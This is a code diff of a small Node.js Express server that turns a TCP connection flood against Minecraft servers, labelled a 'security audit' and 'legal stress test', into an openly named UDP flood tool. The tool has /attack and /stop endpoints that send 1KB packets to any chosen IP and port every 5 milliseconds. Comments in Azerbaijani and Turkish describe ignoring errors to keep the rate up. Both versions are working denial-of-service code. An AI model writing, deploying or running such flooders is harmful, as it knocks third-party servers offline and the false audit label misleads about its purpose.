@@ -1,65 +1,46 @@
-const net = require('net');
 const express = require('express');
-const mcutil = require('minecraft-server-util');
+const dgram = require('dgram');
 const app = express();
+const client = dgram.createSocket('udp4');
+
 app.use(express.json());
-app.use(require('cors')());
+app.use(express.static('public')); // HTML faylların 'public' qovluğunda olsun
 
-// Analiz Verileri
-let auditData = { latency: 0, loadCapacity: "Normal", threatLevel: "Low", activeConnections: 0 };
+let attackInterval;
 
-// Sunucu Sağlık Kontrolü (Audit)
-async function performAudit(host, port) {
-    try {
-        const start = Date.now();
-        await mcutil.status(host, port);
-        auditData.latency = Date.now() - start;
-        
-        if (auditData.latency > 1000) {
-            auditData.loadCapacity = "Critical Overflow";
-            auditData.threatLevel = "High";
-        } else {
-            auditData.loadCapacity = "Stable";
-            auditData.threatLevel = "Low";
+// Paket Atma Funksiyası
+function startFlood(ip, port, power) {
+    const message = Buffer.alloc(1024, 'X'); // 1KB-lıq ağır paket
+    
+    attackInterval = setInterval(() => {
+        for (let i = 0; i < power * 10; i++) { // Power-ə görə sürəti nizamla
+            client.send(message, 0, message.length, port, ip, (err) => {
+                // Səhvləri görməzdən gəlirik ki, sürət düşməsin
+            });
         }
-    } catch (e) {
-        auditData.loadCapacity = "Service Unavailable";
-        auditData.threatLevel = "Maximum Exhaustion";
-    }
+    }, 5); // Çox qısa fasilə (5ms)
 }
 
-// Stres Testi Üretici (Legal Stress Test)
-const runStressTest = (host, port) => {
-    const probe = new net.Socket();
-    probe.connect(port, host, () => {
-        auditData.activeConnections++;
-        // Sunucunun paket işleme kapasitesini ölçmek için veri gönderimi
-        const dataBuffer = Buffer.alloc(1024 * 32, "SECURITY_AUDIT");
-        const stream = setInterval(() => {
-            if (!probe.destroyed) {
-                probe.write(dataBuffer);
-            } else { clearInterval(stream); auditData.activeConnections--; }
-        }, 5);
-    });
-    probe.on('error', () => probe.destroy());
-};
-
-app.post('/start-audit', (req, res) => {
-    const { ip } = req.body;
-    const host = ip.includes(':') ? ip.split(':')[0] : ip;
-    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
-
-    console.log(`[🛡️] Güvenlik Denetimi Başlatıldı: ${host}`);
+// Saytdan gələn əmri qəbul edən hissə
+app.post('/attack', (req, res) => {
+    const { ip, port, power } = req.body;
     
-    setInterval(() => performAudit(host, port), 3000);
-
-    // Ryzen 9 gücüyle kapasite sınırlarını zorla (3500 Thread simülasyonu)
-    for (let i = 0; i < 2500; i++) {
-        setImmediate(() => runStressTest(host, port));
-    }
-
-    res.json({ success: true, message: "Sistem Kapasite Analizi Başlatıldı." });
+    if (attackInterval) clearInterval(attackInterval);
+    
+    console.log(`[Xynis Cloud] Hədəf: ${ip}:${port} | Güc: ${power}`);
+    startFlood(ip, parseInt(port), parseInt(power));
+    
+    res.json({ status: "success", message: "Packets sending..." });
 });
 
-app.get('/audit-status', (req, res) => res.json(auditData));
-app.listen(process.env.PORT || 3000);
+// Hücumu dayandırmaq üçün
+app.post('/stop', (req, res) => {
+    clearInterval(attackInterval);
+    console.log("[Xynis Cloud] Hücum dayandırıldı.");
+    res.json({ status: "stopped" });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Triggerbaba Terminali ${PORT} portunda aktivdir.`);
+});
